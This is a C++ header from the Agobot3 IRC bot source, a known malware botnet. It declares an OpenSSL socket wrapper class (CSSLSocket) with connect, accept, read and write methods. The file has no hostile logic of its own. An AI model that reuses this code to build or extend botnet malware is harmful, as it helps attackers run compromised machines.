/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __SSLLIB_H__
#define __SSLLIB_H__

#ifndef AGOBOT_NO_OPENSSL

class CSSLSocket
{
public:
	CSSLSocket();
	virtual ~CSSLSocket();

	bool Init();
	bool AttachToSocket(int sSocket);
	int GetSocket();

	bool Accept();
	bool Connect();
	void Close();
	int Read(void *pBuf, int iNum);
	int Write(const void *pBuf, int iNum);

	bool m_bConnected;
protected:
#ifndef AGOBOT_PLUGIN_BUILD
	SSL_CTX	*m_psslCtx;
	SSL		*m_pSSL;
#endif // AGOBOT_PLUGIN_BUILD
	int		 m_sSocket;
};

#else

class CSSLSocket;

#endif // AGOBOT_NO_OPENSSL

#endif // __SSLLIB_H__
